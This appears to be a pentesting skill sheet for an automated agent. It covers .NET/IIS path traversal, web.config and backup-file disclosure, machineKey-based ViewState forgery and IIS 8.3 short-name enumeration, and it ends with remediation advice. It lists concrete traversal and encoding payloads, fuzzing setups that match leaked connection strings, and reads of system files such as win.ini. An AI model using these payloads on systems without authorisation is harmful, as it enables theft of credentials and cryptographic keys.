# Path traversal, LFI & config disclosure (.NET / IIS)

Windows paths use backslashes, so traversal differs from PHP.

## File-serving endpoints
`download.aspx?file=`, `?path=`, `?page=`, `?doc=`, `GetFile.ashx?name=` that
call `File.ReadAllText` / `Response.WriteFile` / `Server.MapPath`.
- Target `web.config` (it holds `connectionStrings` and `machineKey`):
  `?file=..\..\web.config`, `?file=../../web.config`,
  encoded `%2e%2e%5c%2e%2e%5cweb.config`, double `%252e%252e%255c`, or absolute
  `C:\inetpub\wwwroot\web.config`.
- Sweep depths/encodings in ONE `http_fuzz`: `url:".../download.aspx?file=FUZZ"`,
  `match_regex:"connectionString|<machineKey|<configuration"`, with the variants
  above as `payloads`. A matched row pins the working form.
- Other juicy reads: `..\App_Data\`, `Global.asax`, source `.aspx.cs`,
  `C:\Windows\win.ini`.

## web.config / connectionStrings disclosure
Direct `/web.config` is normally blocked by IIS, but backups are not:
`web.config.bak`, `web.config~`, `web_config.txt`, `web.config.old`,
`web.config.save` — forced-browse them with `http_fuzz` (skill: fingerprint).
A leaked `<machineKey validationKey decryptionKey>` is critical: it lets you
**forge `__VIEWSTATE`** (skill: viewstate) and defeats the padding oracle.

## IIS 8.3 short-name (tilde) enumeration
IIS leaks 8.3 short names via a status/error differential. Request
`/somel~1*~1.aspx` style probes; a 404 vs a different code reveals the first
chars of hidden files/dirs. Sweep the first character with `http_fuzz`
(marker in the path, `payloads:["a","b",...,"z","0".."9"]`, read status deltas),
then extend matches char by char to recover `web.config`, backup, and admin
directory names.

Evidence: the file contents read (e.g. a `connectionString`) or recovered short
names with the status differential.
Remediation: canonicalize & whitelist file params (reject `..`/`:`/absolute),
deny `.config`/backups in IIS, disable 8.3 names (`fsutil 8dot3name set 1`),
remove source/backup files from the webroot.
